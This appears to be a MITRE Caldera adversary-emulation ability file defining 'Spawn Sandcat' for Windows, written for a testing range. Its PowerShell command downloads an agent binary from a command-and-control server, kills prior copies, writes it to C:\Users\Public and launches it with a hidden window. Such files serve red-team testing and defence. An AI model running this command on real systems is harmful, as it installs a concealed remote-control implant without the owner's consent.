- id: 38b639c7-4812-4933-9356-c1877d1eec03
  name: Spawn Sandcat
  description: Spawn a Sandcat agent
  tactic: command-and-control
  technique:
    attack_id: T1105
    name: "Ingress Tool Transfer"
  platforms:
    # Adapted from mitre/plugins/sandcat
    # Only Windows variant, given that we do not have other targets in our testing range
    windows:
      psh:
        command: |
          $server="#{app.contact.http}";
          $url="$server/file/download";
          $wc=New-Object System.Net.WebClient;
          $wc.Headers.add("platform","windows");
          $wc.Headers.add("file","sandcat.go");
          $data=$wc.DownloadData($url);
          $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
          get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;
          rm -force "C:\Users\Public\$name.exe" -ea ignore;
          [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
          Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group target" -WindowStyle hidden;
